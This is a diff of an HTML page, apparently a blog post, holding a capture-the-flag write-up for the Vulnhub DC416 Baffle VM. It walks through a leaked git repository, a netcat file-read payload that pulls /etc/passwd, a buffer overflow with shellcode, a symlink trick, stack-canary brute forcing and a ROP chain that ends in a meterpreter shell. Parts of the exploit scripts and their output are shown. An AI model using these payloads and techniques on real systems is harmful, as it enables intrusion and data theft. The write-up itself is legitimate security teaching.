@@ -1,67 +1,71 @@
 <!doctype html>
 <html lang="en" prefix="og: http://ogp.me/ns#">
+
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vulnhub - DC416: Baffle Writeup</title>
-    <meta name="description" content="Vulnhub - DC416: Baffle Writeup">
-    
-    <meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, baffle">
-    
-    <meta name="author" content="Christian Mehlmauer">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vulnhub - DC416: Baffle Writeup</title>
+  <meta name="description"
+    content="Vulnhub - DC416: Baffle Writeup">
+  
+  <meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, baffle">
+  
+  <meta name="author" content="Christian Mehlmauer">
 
-    <meta name="twitter:card" content="summary">
-    
-    <meta name="twitter:site" content="@firefart" />
-    <meta name="twitter:creator" content="@firefart" />
-    
-    <meta name="twitter:title" content="Vulnhub - DC416: Baffle Writeup">
-    <meta name="twitter:description" content="Vulnhub - DC416: Baffle Writeup">
-    <meta property="og:title" content="Vulnhub - DC416: Baffle Writeup">
-    <meta property="og:type" content="article">
-    <meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_baffle/" />
-    <meta property="og:description" content="Vulnhub - DC416: Baffle Writeup">
-    
-    <meta property="og:image" content="https://firefart.at/img/misc/vulnhub.png" />
-    <meta name="twitter:image" content="https://firefart.at/img/misc/vulnhub.png" />
-    
-    <meta property="og:updated_time" content="2017-01-02 22:00:00 &#43;0100 CET"/>
-    <meta property="article:author" content="https://twitter.com/firefart"/>
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@firefart" />
+  <meta name="twitter:creator" content="@firefart" />
+  
+  <meta name="twitter:title" content="Vulnhub - DC416: Baffle Writeup">
+  <meta name="twitter:description"
+    content="Vulnhub - DC416: Baffle Writeup">
+  <meta property="og:title" content="Vulnhub - DC416: Baffle Writeup">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_baffle/" />
+  <meta property="og:description"
+    content="Vulnhub - DC416: Baffle Writeup">
+  
+  <meta property="og:image" content="https://firefart.at/img/misc/vulnhub.png" />
+  <meta name="twitter:image" content="https://firefart.at/img/misc/vulnhub.png" />
+  
+  <meta property="og:updated_time" content="2017-01-02 22:00:00 &#43;0100 CET" />
+  <meta property="article:author" content="https://twitter.com/firefart" />
 
-    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet" type="text/css">
-    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
-    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
+  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet"
+    type="text/css">
+  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
+  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
 
-    <link rel="stylesheet" href='https://firefart.at/css/all.min.css'>
-    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="stylesheet" href='https://firefart.at/css/all.css'>
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
-    
-    
-    <script type="application/ld+json">
-    [
-      {
-        "@context" : "http://schema.org",
-        "@type" : "WebSite",
-        "name" : "FireFart",
-        "url" : "https://firefart.at"
+  
+  
+  <script type="application/ld+json">
+    [{
+        "@context": "http://schema.org",
+        "@type": "WebSite",
+        "name": "FireFart",
+        "url": "https://firefart.at"
       },
       {
-        "@context" : "http://schema.org",
-        "@type" : "Person",
-        "name" : "Christian Mehlmauer",
-        "url" : "https://firefart.at",
-        "sameAs" : [
+        "@context": "http://schema.org",
+        "@type": "Person",
+        "name": "Christian Mehlmauer",
+        "url": "https://firefart.at",
+        "sameAs": [
           "https://twitter.com/firefart",
           "https://github.com/FireFart",
           "https://www.facebook.com/christian.mehlmauer"
         ]
       }
     ]
-    </script>
+  </script>
 
 </head>
-<body>
 
+<body>
 
 <div id="layout" class="pure-g">
     <div class="sidebar pure-u-1 pure-u-md-1-4">
@@ -80,7 +84,7 @@
                 
                 
                 <li class="nav-item">
-                     <a class="pure-button" target="_blank" href="https://github.com/FireFart">
+                    <a class="pure-button" target="_blank" href="https://github.com/FireFart">
                         <i class="fa fa-github-alt"></i> Github
                     </a>
                 </li>
@@ -100,7 +104,6 @@
     </div>
 </div>
 
-
     <div class="content pure-u-1 pure-u-md-3-4">
         <div>
             
@@ -118,42 +121,26 @@
                     </header>
 
                     <div id="toc" class="well col-md-4 col-sm-6">
-                      <nav id="TableOfContents">
-<ul>
-<li><a href="#information-gathering">Information Gathering</a></li>
-<li><a href="#alice">alice</a></li>
-<li><a href="#bob">bob</a></li>
-<li><a href="#vulnhub">vulnhub</a></li>
-<li><a href="#charlie">charlie</a></li>
-</ul>
-</nav>
+                        <nav id="TableOfContents"></nav>
                     </div>
 
                     <div class="post-description">
-                      <p>After I finished <a href="/post/vulnhub_dc416_basement/">DC416 - Basement</a> I wanted to give the next VM a try: <a href="https://www.vulnhub.com/entry/dc416-2016,168/">DC416 - baffle</a> by <a href="https://twitter.com/superkojiman">@superkojiman</a>.</p>
-
+                        <p>After I finished <a href="/post/vulnhub_dc416_basement/">DC416 - Basement</a> I wanted to give the next VM a try: <a href="https://www.vulnhub.com/entry/dc416-2016,168/">DC416 - baffle</a> by <a href="https://twitter.com/superkojiman">@superkojiman</a>.</p>
 <p>Here are my other writeups for the DC416 challenges:</p>
-
 <ul>
 <li><a href="/post/vulnhub_dc416_basement/">DC416 Basement</a></li>
 <li><a href="/post/vulnhub_dc416_dick_dastardly/">DC416 Dick Dastardly</a></li>
 <li><a href="/post/vulnhub_dc416_fortress/">DC416 Fortress</a></li>
 </ul>
-
 <h1 id="information-gathering">Information Gathering</h1>
-
 <p>As always I started with a <code>netdiscover</code> to get the machines IP-Address and viewed the instructions on Port 80 in a browser.</p>
-
 <pre><code>Engagement Rules:
     No username/password bruteforcing is necessary
     This box has 5 flags
     Flags are in FLAG{} format
     The goal is not to get root. Get the flags and move on
     Have fun
-</code></pre>
-
-<p>So let&rsquo;s get the party started</p>
-
+</code></pre><p>So let&rsquo;s get the party started</p>
 <pre><code>root@kali:~/baffle# nmap -sSV -T4 -A -p- 192.168.56.2
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-02 21:08 CET
@@ -182,17 +169,10 @@ OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.2 - 4.6
 Network Distance: 1 hop
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-
-<h1 id="alice">alice</h1>
-
+</code></pre><h1 id="alice">alice</h1>
 <p>Nmap found a <code>.git</code> directory in the webroot with directory listing enabled. This allows us to easily retreive the contents using wget</p>
-
 <pre><code>wget -r --no-parent http://192.168.56.2/.git/
-</code></pre>
-
-<p>Now we are able to operate with git on the directory:</p>
-
+</code></pre><p>Now we are able to operate with git on the directory:</p>
 <pre><code>root@kali:~/baffle# cd 192.168.56.2/
 root@kali:~/baffle/192.168.56.2# git status
 On branch master
@@ -203,10 +183,7 @@ Changes not staged for commit:
 	deleted:    hellofriend.c
 
 no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
-</code></pre>
-
-<p>And here is the commit history:</p>
-
+</code></pre><p>And here is the commit history:</p>
 <pre><code>root@kali:~/baffle/192.168.56.2# git log
 commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a
 Author: alice &lt;alice@baffle.me&gt;
@@ -243,12 +220,8 @@ Author: alice &lt;alice@baffle.me&gt;
 Date:   Mon Oct 17 14:30:20 2016 -0400
 
     Hello, friend...
-</code></pre>
-
-<p>Viewing the files on every commit by <code>git checkout HASH</code> we can extract the following revisions of <code>hellofriend.c</code>:</p>
-
+</code></pre><p>Viewing the files on every commit by <code>git checkout HASH</code> we can extract the following revisions of <code>hellofriend.c</code>:</p>
 <p><strong>d7a1f067a2f4ac469bc4cf77c689a34e2286b665</strong></p>
-
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -271,10 +244,7 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-</code></pre>
-
-<p><strong>7edc47a1c3e4dc880a7191915bdbf1565c6b7441</strong></p>
-
+</code></pre><p><strong>7edc47a1c3e4dc880a7191915bdbf1565c6b7441</strong></p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -313,10 +283,7 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-</code></pre>
-
-<p><strong>06483346fab91b2b17471074a887ac7dffd9ceda</strong></p>
-
+</code></pre><p><strong>06483346fab91b2b17471074a887ac7dffd9ceda</strong></p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -355,10 +322,7 @@ int mAin(int arGc, char *argv[]) {
 
     return 0;
 }
-</code></pre>
-
-<p><strong>9b5c226d15d611d6957f3fda7c993186270a6cc4</strong></p>
-
+</code></pre><p><strong>9b5c226d15d611d6957f3fda7c993186270a6cc4</strong></p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -405,10 +369,7 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-</code></pre>
-
-<p><strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong></p>
-
+</code></pre><p><strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong></p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -455,10 +416,7 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-</code></pre>
-
-<p><strong>8bde72465957415c12ab6f89ff679f8f9e7c5c7a</strong></p>
-
+</code></pre><p><strong>8bde72465957415c12ab6f89ff679f8f9e7c5c7a</strong></p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -496,126 +454,72 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-</code></pre>
-
-<p>By looking at the commit log using <code>git log -p</code> we can also see a file called <code>project.enc</code> which was deleted in later commits but more on this later.</p>
-
+</code></pre><p>By looking at the commit log using <code>git log -p</code> we can also see a file called <code>project.enc</code> which was deleted in later commits but more on this later.</p>
 <p>If we look closely on the file at commit <code>My cat danced on the keyboard</code> (<code>06483346fab91b2b17471074a887ac7dffd9ceda</code>) we can notice some uppercase letters. If we only extract the uppercase letters we get the following text:</p>
-
 <pre><code>grep -ohE &quot;[A-Z]&quot; hellofriend.c | tr -d &quot;\n&quot;
 
 FILEFLAGARSEREQUEST
-</code></pre>
-
-<p>So this looks like a flag string. Extracting it manually from the file reveals our first flag:</p>
-
+</code></pre><p>So this looks like a flag string. Extracting it manually from the file reveals our first flag:</p>
 <pre><code>FLAG{ARSE_REQUEST}
-</code></pre>
-
-<p>The service running on port 6969 seems to be a merged version of the <code>hellofriend.c</code> revisions. The latest version of the code seems to check the <code>request type</code> of the received packet. Request code <code>0x01</code> calls the file read code and request code <code>0x02</code> the other one. Also the code always adds two to the char pointer before the filename is parsed so the request type has to be 2 bytes long.</p>
-
+</code></pre><p>The service running on port 6969 seems to be a merged version of the <code>hellofriend.c</code> revisions. The latest version of the code seems to check the <code>request type</code> of the received packet. Request code <code>0x01</code> calls the file read code and request code <code>0x02</code> the other one. Also the code always adds two to the char pointer before the filename is parsed so the request type has to be 2 bytes long.</p>
 <p>So let&rsquo;s have a look at the first code: the file read part.</p>
-
 <p>The file read code ignores the first two bytes(the request type) (<code>ptr = (char *)ptr + 2;</code>) and subtracts 9 from the string length to get the filename length (2 bytes request type + 6 bytes padding + NULL terminator). So all we have to do is send request code 0x01 and pad the filename with 6 random chars.</p>
-
 <pre><code>root@kali:~/baffle# python -c 'print(&quot;\x01\x01/etc/passwdaaaaaa&quot;)' | nc 192.168.56.2 6969
 root:x:0:0:root:/root:/bin/bash
-</code></pre>
-
-<p>As the <code>fgets</code> function only reads text up to a newline or EOF (null byte) character we are only able to read the first line of a file. This behaviour is enough to get the contents of <code>flag.txt</code>:</p>
-
+</code></pre><p>As the <code>fgets</code> function only reads text up to a newline or EOF (null byte) character we are only able to read the first line of a file. This behaviour is enough to get the contents of <code>flag.txt</code>:</p>
 <pre><code>root@kali:~/baffle# python -c 'print(&quot;\x01\x01flag.txtaaaaaa&quot;)' | nc 192.168.56.2 6969
 FLAG{is_there_an_ivana_tinkle}
-</code></pre>
-
-<p>If we look at commit <strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong> we can see an additional file called <code>project.enc</code>. The file seems to be base64 encoded so let&rsquo;s decode it and have a look:</p>
-
+</code></pre><p>If we look at commit <strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong> we can see an additional file called <code>project.enc</code>. The file seems to be base64 encoded so let&rsquo;s decode it and have a look:</p>
 <pre><code>root@kali:~/baffle# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
 root@kali:~/baffle# cat project.enc | base64 -d &gt; exe
 root@kali:~/baffle/192.168.56.2# file exe
 exe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8d8f87535451003b05db15d14d07818576813b49, not stripped
-</code></pre>
-
-<p>So this looks like the compiled code and we can start analyzing it. By looking at the c code (because it&rsquo;s easier to read) we can see our vulnerable code at the bottom:</p>
-
+</code></pre><p>So this looks like the compiled code and we can start analyzing it. By looking at the c code (because it&rsquo;s easier to read) we can see our vulnerable code at the bottom:</p>
 <pre><code>memcpy(data, ptr, 2000);
-</code></pre>
-
-<p>The <code>ptr</code> variable is modified before to cut of the header and then 2000 bytes are written to <code>data</code>. This copies way more bytes into <code>data</code> as it is able to hold (<code>char data[500];</code>).</p>
-
+</code></pre><p>The <code>ptr</code> variable is modified before to cut of the header and then 2000 bytes are written to <code>data</code>. This copies way more bytes into <code>data</code> as it is able to hold (<code>char data[500];</code>).</p>
 <p>As we have the binary we can load it in <code>gdb</code> and check if there are any protections in place</p>
-
 <pre><code>gdb-peda$ checksec
 CANARY    : disabled
 FORTIFY   : disabled
 NX        : disabled
 PIE       : disabled
 RELRO     : disabled
-</code></pre>
-
-<p>We can also check the ASLR status with the file read vulnerability:</p>
-
+</code></pre><p>We can also check the ASLR status with the file read vulnerability:</p>
 <pre><code>root@kali:~/baffle# python -c 'print(&quot;\x01\x01/proc/sys/kernel/randomize_va_spaceaaaaaa&quot;)' | nc 192.168.56.2 6969
 2
-</code></pre>
-
-<p>So the only protection active is ASLR but the executable is compiled without PIE. At the disassembling we can see the code variable <code>to_write</code> is located at the fixed location <code>0x600de0</code>. As the memcpy executed before our vulnerability copies 500 bytes to this location we can plant our evil shellcode there and jump right to it.</p>
-
-<p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctftp_to_write.png" alt="binaryninja" /></p>
-
+</code></pre><p>So the only protection active is ASLR but the executable is compiled without PIE. At the disassembling we can see the code variable <code>to_write</code> is located at the fixed location <code>0x600de0</code>. As the memcpy executed before our vulnerability copies 500 bytes to this location we can plant our evil shellcode there and jump right to it.</p>
+<p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctftp_to_write.png" alt="binaryninja"></p>
 <p>To exploit the vulnerability we first need to be sure we reach the vulnerable <code>memcpy</code>. By looking at the <code>hellofriend.c</code> file we can identify the following conditions that must be met:</p>
-
 <ul>
 <li>request type 0x02 with 2 bytes</li>
 <li>the <code>file_len</code> variable is a <code>strlen</code> of the whole input. As the <code>read</code> function does not stop at null bytes but the <code>strlen</code> does we can simply trick it by adding a null byte.</li>
 <li>After the null byte we need to add another 6 bytes</li>
 <li>After the 6 bytes we can plant our malicous code</li>
 </ul>
-
 <p>First we need to get the exact offset where we are able to control our return so let&rsquo;s create a pattern with a valid header:</p>
-
 <pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 &gt; pattern
 python -c 'print(&quot;\x02\x02asdf\x00aaaaaa&quot;)' | tr -d &quot;\n&quot; &gt; test.txt
 cat pattern &gt;&gt; test.txt
-</code></pre>
-
-<p>Then run it in gdb:</p>
-
+</code></pre><p>Then run it in gdb:</p>
 <pre><code>r &lt; test.txt
-</code></pre>
-
-<p>We can see the <code>ret</code> instruction would return to <code>8Ar9As0As1....</code> so we view the hex representation of the address <code>rsp</code> points to:</p>
-
+</code></pre><p>We can see the <code>ret</code> instruction would return to <code>8Ar9As0As1....</code> so we view the hex representation of the address <code>rsp</code> points to:</p>
 <pre><code>gdb-peda$ x/1xg 0x7fffffffdc98
 0x7fffffffdc98:	0x4130734139724138
-</code></pre>
-
-<p>We can now get the exact offset with <code>pattern_offset.rb</code> which is <code>536</code>:</p>
-
+</code></pre><p>We can now get the exact offset with <code>pattern_offset.rb</code> which is <code>536</code>:</p>
 <pre><code>root@kali:~/baffle# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x4130734139724138
 [*] Exact match at offset 536
-</code></pre>
-
-<p>Now we have all info available to craft our exploit. When running the exploit the shellcode will be placed in the <code>to_write</code> variable and the return address is overwritten with the location of the variable and the shellcode is executed.</p>
-
+</code></pre><p>Now we have all info available to craft our exploit. When running the exploit the shellcode will be placed in the <code>to_write</code> variable and the return address is overwritten with the location of the variable and the shellcode is executed.</p>
 <pre><code>root@kali:~/baffle# ./alice.py
 [*] Switching to interactive mode
 $ id
 uid=1001(alice) gid=1001(alice) groups=1001(alice)
-</code></pre>
-
-<p>We are now dropped into <code>/</code> but we already have the <code>flag.txt</code> from this location.</p>
-
+</code></pre><p>We are now dropped into <code>/</code> but we already have the <code>flag.txt</code> from this location.</p>
 <p>By looking at <code>/etc/passwd</code> we can see that there are 4 users present on the system</p>
-
 <pre><code>vulnhub:x:1000:1000:vulnhub,,,:/home/vulnhub:/bin/bash
 alice:x:1001:1001:Alice,,,:/home/alice:/bin/bash
 bob:x:1002:1002:Bob,,,:/home/bob:/bin/bash
 charlie:x:1003:1003:,,,:/home/charlie:/bin/bash
-</code></pre>
-
-<p>Code:</p>
-
+</code></pre><p>Code:</p>
 <pre><code>#!/usr/bin/env python2
 
 from pwn import *
@@ -674,110 +578,73 @@ except EOFError as e:
 finally:
     with context.quiet:
         p.close()
-</code></pre>
-
-<h1 id="bob">bob</h1>
-
+</code></pre><h1 id="bob">bob</h1>
 <p>Another binary with the suid bit set (owned by <code>charlie</code>) can be found in <code>/home/bob/filez/flag_vault</code>. The directory also contains an unreadable <code>flag.txt</code> and <code>auth.txt</code>. The <code>flag_vault</code> binary contains a buffer overflow which I tried several hours to exploit but there is an easier way:</p>
-
 <p>We can copy the binary to a writeable location, create our own <code>auth.txt</code> and create a symlink to <code>flag.txt</code>. As the binary uses no absolute paths for the files we can trick it to use these two files and we are able to read the contents of the file and get the next flag.</p>
-
-<p><img src="/img/vulnhub_dc416_baffle/binaryninja_flag_vault.png" alt="binaryninja" /></p>
-
+<p><img src="/img/vulnhub_dc416_baffle/binaryninja_flag_vault.png" alt="binaryninja"></p>
 <pre><code>cd /home/alice/
 echo test &gt; auth.txt
 ln -s /home/bob/filez/flag.txt /home/alice/flag.txt
 ln -s /home/bob/filez/flag_vault /home/alice/flag_vault
-</code></pre>
-
-<pre><code>$ ./flag_vault
-______ _                _    _   _             _ _   
-|  ___| |            /\| |/\| | | |           | | |  
+</code></pre><pre><code>$ ./flag_vault
+______ _                _    _   _             _ _
+|  ___| |            /\| |/\| | | |           | | |
 | |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
 |  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
 | |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
 \_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
-                __/ |                                
-               |___/                                 
+                __/ |
+               |___/
 
 ENTER YOUR AUTHENTICATION CODE: test
 CHECKING CODE... CODE IS VALID
 DATA: FLAG{tr3each3ry_anD_cUnn1ng}
-</code></pre>
-
-<p>Using the same trick we can also get the password required by the binary:</p>
-
+</code></pre><p>Using the same trick we can also get the password required by the binary:</p>
 <pre><code>ln -fs /home/bob/filez/auth.txt /home/alice/flag.txt
 $ ./flag_vault
-______ _                _    _   _             _ _   
-|  ___| |            /\| |/\| | | |           | | |  
+______ _                _    _   _             _ _
+|  ___| |            /\| |/\| | | |           | | |
 | |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
 |  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
 | |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
 \_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
-                __/ |                                
-               |___/                                 
+                __/ |
+               |___/
 
 ENTER YOUR AUTHENTICATION CODE: test
 CHECKING CODE... CODE IS VALID
 DATA: we_seek_after_knowledge_and_you_call_us_criminals
-</code></pre>
-
-<h1 id="vulnhub">vulnhub</h1>
-
+</code></pre><h1 id="vulnhub">vulnhub</h1>
 <p>This one was the hardest challenge on baffle for me.</p>
-
 <p>We can use bob&rsquo;s flag as a password for the user <code>bob</code> and ssh into the machine.</p>
-
 <pre><code>sshpass -p tr3each3ry_anD_cUnn1ng ssh bob@192.168.56.2
-</code></pre>
-
-<p>The binary <code>/home/bob/binz/ctfingerd</code> is running on localhost port 7979 under the user <code>vulnhub</code>. So we pull the binary to our machine and start analyzing it.</p>
-
-<p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_query_user.png" alt="binaryninja" /></p>
-
+</code></pre><p>The binary <code>/home/bob/binz/ctfingerd</code> is running on localhost port 7979 under the user <code>vulnhub</code>. So we pull the binary to our machine and start analyzing it.</p>
+<p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_query_user.png" alt="binaryninja"></p>
 <p>In the disassembling of the <code>query_user</code> function we can see a <code>memset</code> of 1000 bytes is done for the user input but the <code>read</code> call reads up to 2000 bytes resulting in an overflow of the buffer. The binary itself has NX and stack canaries enabled so we can not simply overflow the stack as the stack canary would become invalid and terminate the process.</p>
-
 <pre><code>gdb-peda$ checksec
 CANARY    : ENABLED
 FORTIFY   : disabled
 NX        : ENABLED
 PIE       : disabled
 RELRO     : disabled
-</code></pre>
-
-<p>The main process of the <code>ctfingerd</code> binary calls <code>fork</code> after accepting a connection to handle the data sent to it. When doing a <code>fork</code> the whole memory content is shared with the subprocess. As the Stack Canary is calculated only once at program start and stays the same as long as the main process is active we might be able to bruteforce the canary byte by byte. You can read more about this topic in <a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a>.</p>
-
+</code></pre><p>The main process of the <code>ctfingerd</code> binary calls <code>fork</code> after accepting a connection to handle the data sent to it. When doing a <code>fork</code> the whole memory content is shared with the subprocess. As the Stack Canary is calculated only once at program start and stays the same as long as the main process is active we might be able to bruteforce the canary byte by byte. You can read more about this topic in <a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a>.</p>
 <p>Once the forked process returns the main process prints the string <code>---\n</code>. If the canary is invalid the forked process crashes and does not return, so the <code>---\n</code> string is never printed. This way we know that if we guessed a valid stack canary or not.</p>
-
 <p>Screenshot of the stack canary check and the fact that there is no return on fail:</p>
-
-<p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_canary.png" alt="binaryninja" /></p>
-
+<p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_canary.png" alt="binaryninja"></p>
 <p>Here is a screenshot showing the <code>main</code> function printing out <code>---\n</code> after <code>query_user</code> returns:</p>
-
-<p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_main_return.png" alt="binaryninja" /></p>
-
+<p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctfingerd_main_return.png" alt="binaryninja"></p>
 <p>We first try to append one byte after the maximum length of our buffer resulting in an overwrite of the first byte of the stack canary. If we found a correct byte the main process returns <code>---\n</code> and we can proceed with the next byte.</p>
-
 <p>After we have the correct stack canary we can continue with exploitation to get code execution. The binary is dynamically compiled and only contains references to <code>read</code>, <code>write</code> and other libc functions but no <code>system</code>.</p>
-
 <p>As the address on the stack right after the canary is the return address we have control over where to forked process returns.</p>
-
 <p>The binary contains a <code>PLT (Procedure Linkage Table)</code> and a <code>GOT (Global Offsets Table)</code>. What they are for in detail can be read up <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">here</a>. As we have the <code>write</code> function available and the program prints out it&rsquo;s file descriptor on every connect we can craft a ROP chain to write the effective libc address of <code>read</code> obtained from <code>GOT</code> to the file descriptor (we could use any of the available <code>GOT</code> stubs). After leaking the address we can calculate the exact memory location of <code>system</code>, prepare the parameters and jump to this address.</p>
-
 <p>We can copy the libc binary from the machine using our SSH access and get the offset from <code>read</code> and calculate libc&rsquo;s base address.</p>
-
 <pre><code>bob@baffle:~/binz$ ldd ctfingerd
 	linux-vdso.so.1 (0x00007ffc517b9000)
 	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5cbc719000)
 	/lib64/ld-linux-x86-64.so.2 (0x00007f5cbcac4000)
 bob@baffle:~/binz$ ls -al /lib/x86_64-linux-gnu/libc.so.6
   lrwxrwxrwx 1 root root 12 Sep  5 02:09 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.19.so
-</code></pre>
-
-<p>To calculate the offsets we first need to get the location of the <code>read</code> and the <code>system</code> function.</p>
-
+</code></pre><p>To calculate the offsets we first need to get the location of the <code>read</code> and the <code>system</code> function.</p>
 <pre><code>root@kali:~/baffle# readelf -s libc-2.19.so | grep read@
    534: 00000000000dbb90    90 FUNC    WEAK   DEFAULT   12 __read@@GLIBC_2.2.5
    657: 0000000000074890    27 FUNC    GLOBAL DEFAULT   12 _IO_file_read@@GLIBC_2.2.5
@@ -790,32 +657,18 @@ bob@baffle:~/binz$ ls -al /lib/x86_64-linux-gnu/libc.so.6
 root@kali:~/baffle# readelf -s libc-2.19.so | grep system@
    577: 0000000000041490    45 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
   1337: 0000000000041490    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
-</code></pre>
-
-<p>So the <code>read</code> function is located at offset <code>0x00000000000dbb90</code> and <code>system</code> at offset <code>0x0000000000041490</code>. We now need to subtract the <code>read</code> value from the leaked libc address to get the base address of libc in memory. If we then add <code>0x0000000000041490</code> to the calculated base address we get the exact location of <code>system</code> on the target machine.</p>
-
+</code></pre><p>So the <code>read</code> function is located at offset <code>0x00000000000dbb90</code> and <code>system</code> at offset <code>0x0000000000041490</code>. We now need to subtract the <code>read</code> value from the leaked libc address to get the base address of libc in memory. If we then add <code>0x0000000000041490</code> to the calculated base address we get the exact location of <code>system</code> on the target machine.</p>
 <p>As this binary is x64 we can not simply put the arguments for the call to <code>system</code> on the stack, instead we need to pass them through registers.</p>
-
 <p>On x64 parameters are passed the following way (a list of system calls on x64 can be found <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">here</a>):</p>
-
 <pre><code>function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)
                ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
                 call #
-</code></pre>
-
-<p>The binary itself has only a few ROP gadgets available so I used a few ones from libc as we now have the base address but I tried to mostly use gadgets from the binary itself.</p>
-
+</code></pre><p>The binary itself has only a few ROP gadgets available so I used a few ones from libc as we now have the base address but I tried to mostly use gadgets from the binary itself.</p>
 <p>We can now create a rop chain to put the desired values in the registers, call system and watch our command be executed. I decided to call another read from the socket and put my command into the <code>.dynamic</code> section of the binary in memory and then call system with this address.</p>
-
 <p>To test the exploit locally we need to adjust the offsets as the libc version differs with the one from the VM. Also the networking code of the binary is really crappy as it never releases a socket resulting in <code>too many open files</code> error messages when running against the VM. In that case a simple VM reset helps :) But the case that we have to bruteforce the canary on each run and the crappy socket handling makes debugging this binary a pain in the ass - thanks <a href="https://twitter.com/superkojiman">@superkojiman</a> :D</p>
-
 <p>We can expose the local port on our machine by using a SSH port forward and executing the script again - this should get us a shell:</p>
-
 <pre><code>sshpass -p tr3each3ry_anD_cUnn1ng ssh -L 7979:localhost:7979 bob@192.168.56.2
-</code></pre>
-
-<p>Final output of the exploit:</p>
-
+</code></pre><p>Final output of the exploit:</p>
 <pre><code>root@kali:~/baffle# ./ctfingerd.py
 [+] Found part 1/8 of stack canary: 0x0
 [+] Found part 2/8 of stack canary: 0x19
@@ -834,9 +687,7 @@ root@kali:~/baffle# readelf -s libc-2.19.so | grep system@
 [*] system: 0x7f4379f07490
 [*] fd: 818
 [*] Paused (press any to continue)
-</code></pre>
-
-<pre><code>meterpreter &gt; sysinfo
+</code></pre><pre><code>meterpreter &gt; sysinfo
 Computer     : 192.168.56.2
 OS           : Debian 8.6 (Linux 3.16.0-4-amd64)
 Architecture : x64
@@ -844,9 +695,7 @@ Meterpreter  : x86/linux
 
 meterpreter &gt; getuid
 Server username: uid=1000, gid=1000, euid=1000, egid=1000
-</code></pre>
-
-<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
